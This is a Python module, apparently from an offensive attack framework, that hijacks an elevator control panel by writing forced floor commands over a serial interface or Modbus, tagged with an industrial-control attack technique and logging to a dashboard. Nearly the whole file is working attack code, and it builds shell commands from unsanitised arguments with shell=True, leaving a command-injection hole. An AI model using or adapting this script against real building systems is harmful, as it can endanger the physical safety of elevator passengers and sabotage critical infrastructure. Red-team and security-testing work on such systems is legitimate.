#!/usr/bin/env python3
# modules/attacks/elevator_panel_hijack.py

import argparse
import json
import os
import subprocess
import time
from datetime import datetime

LOG_FILE = "results/elevator_hijack.log"
ALERT_FILE = "webgui/alerts.json"
MITRE_TTP = "T0829"

def log_action(message):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.utcnow().isoformat()} | {message}\n")
    print(f"[ELEVATOR] {message}")

def alert_dashboard(message):
    os.makedirs("webgui", exist_ok=True)
    alert = {
        "agent": "elevator_panel_hijack",
        "message": message,
        "type": "critical_infrastructure",
        "timestamp": time.time()
    }
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps(alert) + "\n")

def hijack_panel(protocol, floor, interface):
    try:
        if protocol == "serial":
            cmd = f"echo 'FLOOR:{floor}' > {interface}"
        elif protocol == "modbus":
            cmd = f"modbus-cli write --host {interface} --register 0x01 --value {floor}"
        else:
            log_action(f"[!] Unsupported protocol: {protocol}")
            return

        subprocess.run(cmd, shell=True, check=True, timeout=4)
        log_action(f"[+] Floor command {floor} sent to elevator panel via {protocol}")
        alert_dashboard(f"Elevator override: Floor {floor} requested via {protocol}")
    except Exception as e:
        log_action(f"[!] Command failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack elevator panel to force specific floor command")
    parser.add_argument("--protocol", required=True, choices=["serial", "modbus"], help="Communication protocol")
    parser.add_argument("--floor", required=True, help="Target floor number (e.g. 0, 1, 13)")
    parser.add_argument("--interface", required=True, help="Device interface (e.g. /dev/ttyUSB0, 192.168.1.12)")
    args = parser.parse_args()

    hijack_panel(args.protocol, args.floor, args.interface)
